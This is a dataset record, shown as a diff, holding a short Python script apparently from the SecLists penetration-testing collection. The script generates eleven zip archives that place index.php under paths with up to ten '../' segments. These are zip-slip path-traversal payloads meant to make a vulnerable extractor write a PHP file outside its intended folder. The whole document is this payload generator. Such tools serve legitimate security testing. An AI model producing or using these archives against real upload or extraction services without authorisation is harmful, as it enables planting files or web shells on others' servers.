@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Payloads/Zip-Traversal/make.py",
+  "title": "danielmiessler/SecLists/Payloads/Zip-Traversal/make.py",
+  "text": "#!/usr/bin/env python3\n\nimport zipfile\n\n# The file to USE inside the zip, before compression\nfilein = \"index.php\"\nprint(\"[i] FileIn: %s\\n\" % filein)\n\n# How deep are we going?\ndepth = \"\"\n\n# Loop 11 times (00-10)\nfor i in range(11):\n  # The .zip file to use\n  zipname = \"depth-%02d.zip\" % i\n  print(\"[i] ZipName: %s\" % zipname)\n\n  # Get the zip file out ready\n  with zipfile.ZipFile(zipname , 'w') as zip:\n  \t# The file INSIDDE the zip\n    filezip = \"%s%s\" % (depth, filein)\n    print(\"[i] ZipFile: %s\" % filezip)\n\n    # Write the zip file out\n    zip.write(filein, filezip)\n\n    # Increase depth for next loop\n    depth += \"../\"\n\nprint(\"\\n[i] Done\")\n",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Payloads/Zip-Traversal/make.py",
+  "language": "python",
+  "kind": "code"
+}
